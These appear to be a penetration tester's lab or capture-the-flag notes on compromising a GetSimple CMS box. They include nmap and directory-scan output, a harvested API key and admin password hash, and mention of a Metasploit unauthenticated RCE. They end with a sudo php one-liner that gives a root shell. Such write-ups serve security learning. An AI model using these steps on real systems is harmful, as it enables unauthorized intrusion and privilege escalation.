```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
|_  256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin/
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Welcome to GetSimple! - gettingstarted
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

/admin requires a login
port 22 could be used to pivot or login using creds
Enum http further to potentially find version

Apache/2.4.41
/admin/ sub directory scan
```
/.htaccess            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/inc                  (Status: 301) [Size: 318] [--> http://10.129.159.36/admin/inc/]
/index.php            (Status: 200) [Size: 2623]
/lang                 (Status: 301) [Size: 319] [--> http://10.129.159.36/admin/lang/]
/template             (Status: 301) [Size: 323] [--> http://10.129.159.36/admin/template/]
Progress: 4614 / 4615 (99.98%)


```
- Scan of the main domain
```
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/admin                (Status: 301) [Size: 314] [--> http://10.129.159.36/admin/]
/backups              (Status: 301) [Size: 316] [--> http://10.129.159.36/backups/]
/data                 (Status: 301) [Size: 313] [--> http://10.129.159.36/data/]
/index.php            (Status: 200) [Size: 5485]
/plugins              (Status: 301) [Size: 316] [--> http://10.129.159.36/plugins/]
/robots.txt           (Status: 200) [Size: 32]
/server-status        (Status: 403) [Size: 278]
/sitemap.xml          (Status: 200) [Size: 431]
/theme                (Status: 301) [Size: 314] [--> http://10.129.159.36/theme/]
Progress: 4614 / 4615 (99.98%)

```


Index.php is the same as admin
Robots.txt only has disallow admin which we already know exists
backups has folders that can be investigated
	Nothing in backups
	
plugins
	does not appear to have anything of interest yet, just some php scripts.
```
Cache information
{"status":"0","latest":"3.3.16","your_version":"3.3.15","message":"You have an old version - please upgrade"}
```
```
<item>
<apikey>4f399dc72ff8e619e327800f851e9986</apikey>
</item>
```
This may be the api key?
Admin information stored in /data/users/admin.xml
```
<USR>admin</USR>
<NAME/>
<PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>
<EMAIL>admin@gettingstarted.com</EMAIL>
```
Login does not appear to work
```
admin@10.129.159.36: Permission denied (publickey,password).
```
Can't ssh need the public key.
It also appears that admin is for ssh and not the login for the website

Used metasploit after not finding anything, found the version was 3.3.15 and it had a Unauthorized RCE.

```
User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php

```

```
CMD="/usr/bin/bash"
sudo php -r "system('$CMD');"
```
allows us to elevate to root